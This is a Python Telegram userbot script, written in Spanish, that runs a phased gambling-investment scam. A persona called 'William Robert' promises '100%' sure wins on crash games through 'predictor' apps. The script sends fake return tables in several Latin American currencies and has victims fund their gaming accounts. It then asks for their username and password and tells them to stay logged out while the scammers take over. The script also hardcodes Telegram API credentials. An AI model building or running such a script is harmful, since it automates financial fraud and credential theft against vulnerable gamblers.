import time
import asyncio
import os
import json
from telethon import TelegramClient, events

API_ID = 30776682
API_HASH = 'd2e9ad1c3dda250716a24a73d77ae6a6'

# --- EMOJIS PREMIUM OFICIALES DEL PROYECTO ---
E_ESTRELLA = '<tg-emoji emoji-id="5370784581341422520">⭐️</tg-emoji>'
E_GAFAS = '<tg-emoji emoji-id="5235684778727974441">😎</tg-emoji>'
E_PULGAR = '<tg-emoji emoji-id="5393130162311157022">👍</tg-emoji>'
E_FLECHA = '<tg-emoji emoji-id="5429651785352501917">↗️</tg-emoji>'
E_BOLSA = '<tg-emoji emoji-id="5453901475648390219">🛍</tg-emoji>'
E_COHETE = '<tg-emoji emoji-id="5188481279963715781">🚀</tg-emoji>'
E_DIVISAS = '<tg-emoji emoji-id="5377336227533969892">💱</tg-emoji>'
E_ADN1 = '<tg-emoji emoji-id="5215621964286142449">🧬</tg-emoji>'
E_REGALO = '<tg-emoji emoji-id="5215668908278686541">🎁</tg-emoji>'
E_ADN2 = '<tg-emoji emoji-id="5215673679987355184">🧬</tg-emoji>'
E_DIAMANTE = '<tg-emoji emoji-id="6059684519437405439">💎</tg-emoji>'

path = os.path.expanduser("~/Desktop/asistente_premium")
os.makedirs(path, exist_ok=True)
ARCHIVO_REGISTRO_CLIENTES = os.path.join(path, "clientes_atendidos.json")

CARPETA_AUDIO = r"C:\Users\carls\Desktop\AUDIO BIENVENIDO"

if os.path.exists(ARCHIVO_REGISTRO_CLIENTES):
    with open(ARCHIVO_REGISTRO_CLIENTES, "r", encoding="utf-8") as f:
        try:
            clientes_atendidos = json.load(f)
        except:
            clientes_atendidos = {}
else:
    clientes_atendidos = {}

def guardar_registro_clientes():
    with open(ARCHIVO_REGISTRO_CLIENTES, "w", encoding="utf-8") as f:
        json.dump(clientes_atendidos, f, indent=4, ensure_ascii=False)

client = TelegramClient(os.path.join(path, "sesion_nueva_prueba_2"), API_ID, API_HASH)

palabras_inicio = ["hola", "hola me interesa", "hola quiero ganar", "estoy interesado", "deseo informacion", "informacion"]
palabras_audio_bienvenida = ["aviator", "spaceman", "lucky jet", "si estoy de acuerdo", "de acuerdo", "si me interesa", "si me parece bien", "esta bien de acuerdo", "juego en aviator"]
palabras_recarga_lista = ["ya recargué", "ya recargue", "ya tengo la recarga", "ya estoy listo", "listo", "ya hice la recarga", "ya recargé mi cuenta"]
palabras_acuerdo_terminos = ["si señor de acuerdo", "si estoy de acuerdo", "de acuerdo", "si estoy de acuerdo con usted", "confirmando los terminos", "estoy de acuerdo", "conforme", "si acepto"]

@client.on(events.NewMessage(incoming=True, func=lambda e: e.is_private))
async def manejador_mensajes(event):
    try:
        remitente = await event.get_sender()
        if not remitente or remitente.bot:
            return

        user_id_str = str(remitente.id)
        username = f"@{remitente.username}" if remitente.username else ""
        texto_cliente = event.raw_text.lower().strip() if event.raw_text else ""
        es_audio = bool(event.message.voice or event.message.audio)

        estado_usuario = clientes_atendidos.get(user_id_str, {"fase": 0})
        fase_actual = estado_usuario.get("fase", 0)

        # ==========================================
        # FASE 0: Detectar palabras de inicio ➡️ Bienvenida oficial
        # ==========================================
        if fase_actual == 0:
            coincide_inicio = any(p in texto_cliente for p in palabras_inicio)
            if coincide_inicio:
                clientes_atendidos[user_id_str] = {
                    "fase": 1,
                    "fecha": time.strftime("%Y-%m-%d %H:%M:%S")
                }
                guardar_registro_clientes()

                texto_bienvenida = (
                    f"{E_ESTRELLA}<b>HOLA</b>{E_ESTRELLA}\n"
                    f"{E_ESTRELLA}<b>MUCHO GUSTO MI NOMBRE ES</b>{E_ESTRELLA}\n\n"
                    f"<b>WILLIAM ROBERT</b>\n\n"
                    f"{E_REGALO}<b>TE COMENTO CÓMO TRABAJAMOS,</b> {E_COHETE}<b>Y SÍ TE INTERESA ME CONFIRMAS, NOSOTROS TRABAJAMOS</b> {E_DIAMANTE}{E_DIAMANTE}<b>40%</b> {E_DIAMANTE}{E_DIAMANTE}<b>60%</b> {E_DIAMANTE}<b>DE LAS GANANCIAS QUE SE OBTENGAN YA QUE TRABAJAMOS CON APLICACIONES PREDICTOR QUE NOS INDICAN CADA SECUENCIA Y CADA ALGORITMO QUE ESTEMOS LLEVANDO A CABO YA QUE MANEJAMOS RESULTADOS</b> {E_DIAMANTE}<b>100%</b>{E_DIAMANTE}<b>EFECTIVOS SI TE INTERESA TRABAJAR CON NOSOTROS ME CONFIRMA</b>{E_ESTRELLA}\n\n\n"
                    f"{E_DIVISAS}<b>PRIMERO GANAS LUEGO PAGAS MANEJAMOS UN RESULTADO 100% SEGURO Y CONFIABLE</b>{E_DIVISAS}\n\n\n"
                    f"{E_ESTRELLA}<b>AVIATOR</b> {E_ESTRELLA}\n\n\n"
                    f"{E_ESTRELLA}<b>SPACEMAN</b> {E_ESTRELLA}\n\n\n"
                    f"{E_ESTRELLA}<b>LUCKY JET</b> {E_ESTRELLA}"
                )
                await event.respond(texto_bienvenida, parse_mode='html')

        # ==========================================
        # FASE 1: Tras bienvenida ➡️ 45s audio, 30s texto obligatorio
        # ==========================================
        elif fase_actual == 1:
            coincide_palabra = any(p in texto_cliente for p in palabras_audio_bienvenida)
            if coincide_palabra:
                clientes_atendidos[user_id_str]["fase"] = 2
                guardar_registro_clientes()
                
                async def secuencia_post_bienvenida():
                    await asyncio.sleep(45)
                    audio_encontrado = False
                    if os.path.exists(CARPETA_AUDIO):
                        for archivo in os.listdir(CARPETA_AUDIO):
                            if archivo.lower().endswith(('.ogg', '.mp3', '.m4a', '.wav', '.oga')):
                                ruta_completa = os.path.join(CARPETA_AUDIO, archivo)
                                await client.send_file(event.chat_id, ruta_completa, voice_note=True)
                                audio_encontrado = True
                                break
                    
                    await asyncio.sleep(30)
                    texto_obligatorio = (
                        f"{E_ESTRELLA}<b>HOLA QUE TAL</b>{E_ESTRELLA}\n\n"
                        f"{E_ESTRELLA}<b>PRIMERO QUE TODO, PARA PROCEDER ATENDERTE</b>{E_ESTRELLA}\n\n"
                        f"{E_COHETE}<b>PROCESO OBLIGATORIO</b>{E_COHETE}\n\n\n"
                        f"{E_ESTRELLA}<b>ENVIAR UN AUDIO</b>{E_ESTRELLA}\n\n"
                        f"{E_ESTRELLA}<b>PRESENTÁNDOTE</b>{E_ESTRELLA}\n"
                        f"{E_ESTRELLA}<b>CON TU NOMBRE,</b>{E_ESTRELLA} {E_DIAMANTE}\n"
                        f"{E_ESTRELLA}<b>TU APELLIDO,</b>{E_ESTRELLA}\n\n"
                        f"Y\n\n"
                        f"{E_ESTRELLA}<b>EN QUE PLATAFORMA JUEGAS</b>{E_ESTRELLA}\n\n"
                        f"{E_ESTRELLA}<b>PARA QUE UNO DE NUESTROS ASESORES PROCEDA ATENDERTE EN UN MOMENTO</b>{E_ESTRELLA}"
                    )
                    await client.send_message(event.chat_id, texto_obligatorio, parse_mode='html')

                asyncio.create_task(secuencia_post_bienvenida())

        # ==========================================
        # FASE 2: Al recibir el audio de presentación ➡️ Enviar mensaje pidiendo el país
        # ==========================================
        elif fase_actual == 2:
            if es_audio:
                clientes_atendidos[user_id_str]["fase"] = 25
                guardar_registro_clientes()

                print(f"🎤 Audio de presentación recibido de ({username or user_id_str}). Solicitando país...")

                texto_pedir_pais = (
                    f"{E_COHETE} <b>PARA PODER OFRECERTE EL PROCESO DEPENDIENDO DONDE JUEGUES, DIME DE QUE PAIS ERES ASI PODREMOS CONECTARNOS, AHORA PARA QUE EL SISTEMA SEA CONECTADO,</b> {E_ESTRELLA}"
                )
                await event.respond(texto_pedir_pais, parse_mode='html')

        # ==========================================
        # FASE 2.5: Recibir respuesta de qué país es ➡️ Detectar país, esperar 5s y enviar Tabla completa
        # ==========================================
        elif fase_actual == 25:
            if not event.out:
                print(f"📩 Respuesta de país recibida: '{texto_cliente}'")

                moneda = "USD"
                if any(k in texto_cliente for k in ["peru", "perú", "soles", "lima"]):
                    moneda = "PEN"
                elif any(k in texto_cliente for k in ["mexico", "méxico", "mexicanos", "mxn"]):
                    moneda = "MXN"
                elif any(k in texto_cliente for k in ["colombia", "colombiano", "pesos", "cop"]):
                    moneda = "COP"
                elif any(k in texto_cliente for k in ["chile", "chileno", "clp"]):
                    moneda = "CLP"
                elif any(k in texto_cliente for k in ["venezuela", "venezolano", "bs", "bolivares", "bolívares"]):
                    moneda = "VES"
                elif "usdc" in texto_cliente:
                    moneda = "USDC"

                clientes_atendidos[user_id_str]["fase"] = 3
                clientes_atendidos[user_id_str]["moneda"] = moneda
                guardar_registro_clientes()

                print(f"🎯 Moneda detectada: {moneda}. Esperando 5 segundos exactos...")

                await asyncio.sleep(5)

                if moneda == "MXN":
                    texto_inversion = (
                        f"{E_ESTRELLA} <b>¡Bienvenidos a la nueva oportunidad de inversión!</b> {E_REGALO}\n\n"
                        f"{E_DIAMANTE} <b>Aquí puedes empezar desde solo $200 MXN y ver crecer tu ganancia hasta x25.</b>\n\n"
                        f"{E_COHETE} <b>¡Tú eliges cuánto invertir y nosotros te guiamos en el proceso!</b>\n\n\n"
                        f"{E_BOLSA} <b>TABLA DE INVERSIÓN Y GANANCIA (MÉXICO)</b> {E_BOLSA}\n\n"
                        f"{E_FLECHA} $200 MXN {E_GAFAS} $5,000 MXN\n\n"
                        f"{E_FLECHA} $400 MXN {E_GAFAS} $8,400 MXN\n\n"
                        f"{E_FLECHA} $600 MXN {E_GAFAS} $12,000 MXN\n\n"
                        f"{E_FLECHA} $1,000 MXN {E_GAFAS} $15,000 MXN\n\n"
                        f"{E_FLECHA} $2,000 MXN {E_GAFAS} $31,800 MXN\n\n\n"
                        f"{E_ESTRELLA} <b>Si deseas hacer una inversión más alta, te daré la información al instante.</b> {E_DIAMANTE}"
                    )
                elif moneda == "PEN":
                    texto_inversion = (
                        f"{E_ESTRELLA} <b>¡Bienvenidos a la nueva oportunidad de inversión!</b> {E_REGALO}\n\n"
                        f"{E_DIAMANTE} <b>Aquí puedes empezar desde solo S/ 40 PEN y ver crecer tu ganancia hasta x25.</b>\n\n"
                        f"{E_COHETE} <b>¡Tú eliges cuánto invertir y nosotros te guiamos en el proceso!</b>\n\n\n"
                        f"{E_BOLSA} <b>TABLA DE INVERSIÓN Y GANANCIA (PERÚ)</b> {E_BOLSA}\n\n"
                        f"{E_FLECHA} S/ 40 PEN {E_GAFAS} S/ 1,000 PEN\n\n"
                        f"{E_FLECHA} S/ 80 PEN {E_GAFAS} S/ 1,680 PEN\n\n"
                        f"{E_FLECHA} S/ 120 PEN {E_GAFAS} S/ 2,400 PEN\n\n"
                        f"{E_FLECHA} S/ 200 PEN {E_GAFAS} S/ 3,000 PEN\n\n"
                        f"{E_FLECHA} S/ 400 PEN {E_GAFAS} S/ 6,360 PEN\n\n\n"
                        f"{E_ESTRELLA} <b>Si deseas hacer una inversión más alta, te daré la información al instante.</b> {E_DIAMANTE}"
                    )
                elif moneda == "COP":
                    texto_inversion = (
                        f"{E_ESTRELLA} <b>¡Bienvenidos a la nueva oportunidad de inversión!</b> {E_REGALO}\n\n"
                        f"{E_DIAMANTE} <b>Aquí puedes empezar desde solo $40,000 COP y ver crecer tu ganancia hasta x25.</b>\n\n"
                        f"{E_COHETE} <b>¡Tú eliges cuánto invertir y nosotros te guiamos en el proceso!</b>\n\n\n"
                        f"{E_BOLSA} <b>TABLA DE INVERSIÓN Y GANANCIA (COLOMBIA)</b> {E_BOLSA}\n\n"
                        f"{E_FLECHA} $40,000 COP {E_GAFAS} $1,000,000 COP\n\n"
                        f"{E_FLECHA} $80,000 COP {E_GAFAS} $1,680,000 COP\n\n"
                        f"{E_FLECHA} $120,000 COP {E_GAFAS} $2,400,000 COP\n\n"
                        f"{E_FLECHA} $200,000 COP {E_GAFAS} $3,000,000 COP\n\n"
                        f"{E_FLECHA} $400,000 COP {E_GAFAS} $6,360,000 COP\n\n\n"
                        f"{E_ESTRELLA} <b>Si deseas hacer una inversión más alta, te daré la información al instante.</b> {E_DIAMANTE}"
                    )
                elif moneda == "CLP":
                    texto_inversion = (
                        f"{E_ESTRELLA} <b>¡Bienvenidos a la nueva oportunidad de inversión!</b> {E_REGALO}\n\n"
                        f"{E_DIAMANTE} <b>Aquí puedes empezar desde solo $10,000 CLP y ver crecer tu ganancia hasta x25.</b>\n\n"
                        f"{E_COHETE} <b>¡Tú eliges cuánto invertir y nosotros te guiamos en el proceso!</b>\n\n\n"
                        f"{E_BOLSA} <b>TABLA DE INVERSIÓN Y GANANCIA (CHILE)</b> {E_BOLSA}\n\n"
                        f"{E_FLECHA} $10,000 CLP {E_GAFAS} $250,000 CLP\n\n"
                        f"{E_FLECHA} $20,000 CLP {E_GAFAS} $420,000 CLP\n\n"
                        f"{E_FLECHA} $30,000 CLP {E_GAFAS} $600,000 CLP\n\n"
                        f"{E_FLECHA} $50,000 CLP {E_GAFAS} $750,000 CLP\n\n"
                        f"{E_FLECHA} $100,000 CLP {E_GAFAS} $1,590,000 CLP\n\n\n"
                        f"{E_ESTRELLA} <b>Si deseas hacer una inversión más alta, te daré la información al instante.</b> {E_DIAMANTE}"
                    )
                elif moneda == "VES":
                    texto_inversion = (
                        f"{E_ESTRELLA} <b>¡Bienvenidos a la nueva oportunidad de inversión!</b> {E_REGALO}\n\n"
                        f"{E_DIAMANTE} <b>Aquí puedes empezar desde solo Bs. 400 y ver crecer tu ganancia hasta x25.</b>\n\n"
                        f"{E_COHETE} <b>¡Tú eliges cuánto invertir y nosotros te guiamos en el proceso!</b>\n\n\n"
                        f"{E_BOLSA} <b>TABLA DE INVERSIÓN Y GANANCIA (VENEZUELA)</b> {E_BOLSA}\n\n"
                        f"{E_FLECHA} Bs. 400 {E_GAFAS} Bs. 10,000\n\n"
                        f"{E_FLECHA} Bs. 800 {E_GAFAS} Bs. 16,800\n\n"
                        f"{E_FLECHA} Bs. 1,200 {E_GAFAS} Bs. 24,000\n\n"
                        f"{E_FLECHA} Bs. 2,000 {E_GAFAS} Bs. 30,000\n\n"
                        f"{E_FLECHA} Bs. 4,000 {E_GAFAS} Bs. 63,600\n\n\n"
                        f"{E_ESTRELLA} <b>Si deseas hacer una inversión más alta, te daré la información al instante.</b> {E_DIAMANTE}"
                    )
                elif moneda == "USDC":
                    texto_inversion = (
                        f"{E_ESTRELLA} <b>¡Bienvenidos a la nueva oportunidad de inversión!</b> {E_REGALO}\n\n"
                        f"{E_DIAMANTE} <b>Aquí puedes empezar desde solo $10 USDC y ver crecer tu ganancia hasta x25.</b>\n\n"
                        f"{E_COHETE} <b>¡Tú eliges cuánto invertir y nosotros te guiamos en el proceso!</b>\n\n\n"
                        f"{E_BOLSA} <b>TABLA DE INVERSIÓN Y GANANCIA (USDC)</b> {E_BOLSA}\n\n"
                        f"{E_FLECHA} $10 USDC {E_GAFAS} $250 USDC\n\n"
                        f"{E_FLECHA} $20 USDC {E_GAFAS} $420 USDC\n\n"
                        f"{E_FLECHA} $30 USDC {E_GAFAS} $600 USDC\n\n"
                        f"{E_FLECHA} $50 USDC {E_GAFAS} $750 USDC\n\n"
                        f"{E_FLECHA} $100 USDC {E_GAFAS} $1,590 USDC\n\n\n"
                        f"{E_ESTRELLA} <b>Si deseas hacer una inversión más alta, te daré la información al instante.</b> {E_DIAMANTE}"
                    )
                else:
                    texto_inversion = (
                        f"{E_ESTRELLA} <b>¡Bienvenidos a la nueva oportunidad de inversión!</b> {E_REGALO}\n\n"
                        f"{E_DIAMANTE} <b>Aquí puedes empezar desde solo $10 USD y ver crecer tu ganancia hasta x25.</b>\n\n"
                        f"{E_COHETE} <b>¡Tú eliges cuánto invertir y nosotros te guiamos en el proceso!</b>\n\n\n"
                        f"{E_BOLSA} <b>TABLA DE INVERSIÓN Y GANANCIA (USD)</b> {E_BOLSA}\n\n"
                        f"{E_FLECHA} $10 USD {E_GAFAS} $250 USD\n\n"
                        f"{E_FLECHA} $20 USD {E_GAFAS} $420 USD\n\n"
                        f"{E_FLECHA} $30 USD {E_GAFAS} $600 USD\n\n"
                        f"{E_FLECHA} $50 USD {E_GAFAS} $750 USD\n\n"
                        f"{E_FLECHA} $100 USD {E_GAFAS} $1,590 USD\n\n\n"
                        f"{E_ESTRELLA} <b>Si deseas hacer una inversión más alta, te daré la información al instante.</b> {E_DIAMANTE}"
                    )

                await event.respond(texto_inversion, parse_mode='html')
                print(f"✨ Tabla de inversión en '{moneda}' enviada con éxito.")

        # ==========================================
        # Fase 3: Tras ver la tabla, detectamos el valor de inversión mencionado ➡️ Mensaje de recarga
        # ==========================================
        elif fase_actual == 3:
            if not event.out:
                if any(char.isdigit() for char in texto_cliente):
                    clientes_atendidos[user_id_str]["fase"] = 4
                    guardar_registro_clientes()

                    print(f"💰 Valor de inversión seleccionado: '{texto_cliente}'. Enviando mensaje de recarga...")

                    texto_recarga = (
                        f"{E_REGALO} <b>OK PERFECTO MUY BIEN…</b> {E_REGALO} "
                        f"{E_DIVISAS} <b>PROCEDE A RECARGAR TU CUENTA</b> {E_ADN1} <b>DE JUEGO, CON LA INVERSIÓN QUE</b> {E_DIAMANTE} <b>DESEA HACER CUANDO</b> {E_FLECHA} <b>RECARGUES TU CUENTA DE JUEGO</b> {E_ESTRELLA} "
                        f"<b>ME CONFIRMAS PARA NOTIFICARTE</b> {E_BOLSA} <b>LOS SIGUIENTES PASOS A SEGUIR.</b> {E_COHETE} <b>QUEDO ATENTO. MUCHAS GRACIAS</b> {E_REGALO}"
                    )
                    await event.respond(texto_recarga, parse_mode='html')
                    print(f"✨ Mensaje de recarga enviado con éxito.")

        # ==========================================
        # Fase 4: Al confirmar recarga ➡️ Enviar términos y condiciones (40% - 60%)
        # ==========================================
        elif fase_actual == 4:
            if not event.out:
                coincide_recarga_lista = any(p in texto_cliente for p in palabras_recarga_lista)
                if coincide_recarga_lista or "ya" in texto_cliente or "listo" in texto_cliente or "recarg" in texto_cliente:
                    clientes_atendidos[user_id_str]["fase"] = 5
                    guardar_registro_clientes()

                    print(f"📩 Confirmación de recarga detectada. Enviando términos y condiciones...")

                    texto_terminos = (
                        f"{E_ADN1} <b>OK, COMÉNTAME SI ESTÁS</b> {E_ESTRELLA} <b>TOTALMENTE</b> {E_GAFAS} <b>DE ACUERDO CON LOS TÉRMINOS Y CONDICIONES, ES DECIR</b> {E_DIAMANTE} <b>40% DE LAS GANANCIAS</b> {E_PULGAR} <b>PARA TI 60% PARA NOSOTROS SI ESTÁS TOTALMENTE DE ACUERDO POR FAVOR ME CONFIRMAS. GRACIAS</b> {E_FLECHA}"
                    )
                    await event.respond(texto_terminos, parse_mode='html')
                    print(f"✨ Mensaje de términos y condiciones enviado con éxito.")

        # ==========================================
        # Fase 5: Al confirmar acuerdo con términos ➡️ Pedir usuario y contraseña
        # ==========================================
        elif fase_actual == 5:
            if not event.out:
                coincide_acuerdo = any(p in texto_cliente for p in palabras_acuerdo_terminos) or "acuerdo" in texto_cliente or "si" in texto_cliente or "confirmo" in texto_cliente
                if coincide_acuerdo:
                    clientes_atendidos[user_id_str]["fase"] = 6
                    guardar_registro_clientes()

                    print(f"📩 Acuerdo con términos detectado de ({username or user_id_str}). Solicitando usuario y contraseña...")

                    texto_credenciales = (
                        f"{E_ADN1} <b>OK PERFECTO MUY BIEN, POR</b> {E_PULGAR} <b>FAVOR ENVÍAME USUARIO Y CONTRASEÑA PARA PROCEDER A</b> {E_GAFAS} <b>CONECTAR TU CUENTA DIRECTAMENTE</b> {E_DIAMANTE} <b>AL SERVIDOR Y ASIMISMO PODER COMENZAR A INCREMENTAR TUS GANANCIAS POR FAVOR</b> {E_ESTRELLA} <b>QUEDO ATENTO</b> {E_COHETE}"
                    )
                    await event.respond(texto_credenciales, parse_mode='html')
                    print(f"✨ Mensaje de solicitud de credenciales enviado con éxito.")

        # ==========================================
        # Fase 6: Recibir usuario y contraseña (validando correo electrónico) ➡️ Enviar aviso de cuenta desconectada
        # ==========================================
        elif fase_actual == 6:
            if not event.out:
                if "@" in texto_cliente and any(dom in texto_cliente for dom in ["gmail", "hotmail", "outlook", "yahoo", "icloud", "live", "msn"]):
                    clientes_atendidos[user_id_str]["fase"] = 7
                    guardar_registro_clientes()

                    print(f"📩 Credenciales (correo) recibidas de ({username or user_id_str}). Enviando aviso de desconexión...")

                    texto_desconexion = (
                        f"{E_PULGAR} <b>PERFECTO, EN EL MOMENTO QUE NOSOTROS NOS ENCONTRAMOS</b> {E_ADN1} <b>INCREMENTADOS DE SALDO DE UNA MANERA SEGURA Y CONFIABLE NECESITO QUE</b> {E_DIAMANTE} <b>MANTENGAS TU CUENTA DESCONECTADA Y NO INICIA</b> {E_ESTRELLA} <b>SESIÓN PARA NO PRESENTAR INCONVENIENTES CON EL SERVIDOR A MEDIDA DE ESTAR</b> {E_GAFAS} <b>INCREMENTANDO TU SALDO TE VAMOS A ESTAR</b> {E_COHETE} <b>ENVIANDO FOTO Y VIDEO DE LAS GANANCIAS QUE ESTEMOS INCREMENTANDO. GRACIAS ASÍ QUE POR</b> {E_REGALO} <b>FAVOR CUANDO DESCONECTES TU CUENTA ME CONFIRMAS PARA PODER COMENZAR.</b> {E_BOLSA}{E_DIVISAS}"
                    )
                    await event.respond(texto_desconexion, parse_mode='html')
                    print(f"✨ Mensaje de aviso de cuenta desconectada enviado con éxito.")
                else:
                    print(f"⏳ Esperando que el usuario envíe un correo electrónico válido con su contraseña...")

    except Exception as e:
        print(f"⚠️ Error procesando mensaje privado: {e}")

async def main():
    print("🚀 ASISTENTE PRIVADO ACTIVO - CREDENCIALES API ACTUALIZADAS")
    await client.run_until_disconnected()

if __name__ == '__main__':
    while True:
        try:
            with client:
                client.loop.run_until_complete(main())
        except Exception as e:
            print(f"⚠️ [AVISO DE RECONEXIÓN] Ocurrió un error general: {e}. Reiniciando en 5 segundos...")
            time.sleep(5)
